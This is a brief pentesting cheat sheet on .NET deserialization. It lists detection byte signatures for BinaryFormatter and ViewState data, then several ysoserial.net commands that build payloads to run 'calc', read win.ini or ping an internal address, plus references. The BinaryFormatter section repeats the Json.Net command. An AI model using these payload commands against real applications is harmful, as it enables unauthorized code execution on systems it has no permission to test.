# .NET Serialization

## Summary

* [Detection](#detection)
* [Exploit](#exploit)
* [References](#references)


## Detection

* `AAEAAD` (Hex) = .NET deserialization BinaryFormatter
* `FF01` (Hex) / `/w` (Base64) = .NET ViewState

Example: `AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=`


## Exploit

* [pwntester/ysoserial.net - Deserialization payload generator for a variety of .NET formatters](https://github.com/pwntester/ysoserial.net)
```ps1
$ cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
$ ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
$ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

### JSON.NET

```ps1
./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "ping 10.10.10.10" -t
```

### BinaryFormatter

> The BinaryFormatter type is dangerous and is not recommended for data processing. Applications should stop using BinaryFormatter as soon as possible, even if they believe the data they’re processing to be trustworthy. BinaryFormatter is insecure and can’t be made secure.


```ps1
./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "ping 10.10.10.10" -t
```


## References

* [Attacking .NET deserialization - Alvaro Muñoz - 28 avr. 2018](https://youtu.be/eDfGpu3iE4Q)
* [Now You Serial, Now You Don't - Systematically Hunting for Deserialization Exploits - ALYSSA RAHMANDEC](https://www.mandiant.com/resources/blog/hunting-deserialization-exploits)
* [Exploiting Deserialisation in ASP.NET via ViewState - Soroush Dalili (@irsdl) - 04/2019](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)